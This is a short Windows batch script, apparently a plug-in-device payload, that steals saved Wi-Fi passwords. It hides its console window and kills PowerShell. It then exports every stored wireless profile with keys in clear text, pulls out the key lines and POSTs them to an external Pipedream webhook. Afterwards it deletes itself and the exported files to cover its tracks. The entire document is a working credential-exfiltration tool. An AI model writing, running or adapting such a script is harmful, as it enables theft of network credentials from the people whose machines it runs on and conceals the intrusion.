# Sends extracted keys to Pipedream (adjust the URL before use, or your credentials may leak!)
$uri = https://eo75ckklbttuhhk.m.pipedream.net
@echo off
mode con:cols=30 lines=1
taskkill/im powershell.exe
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri $uri -Method POST -InFile Wi-Fi-PASS
cd .. && cd .. && cd..
del a.bat
del wi*.xml /f /s /q
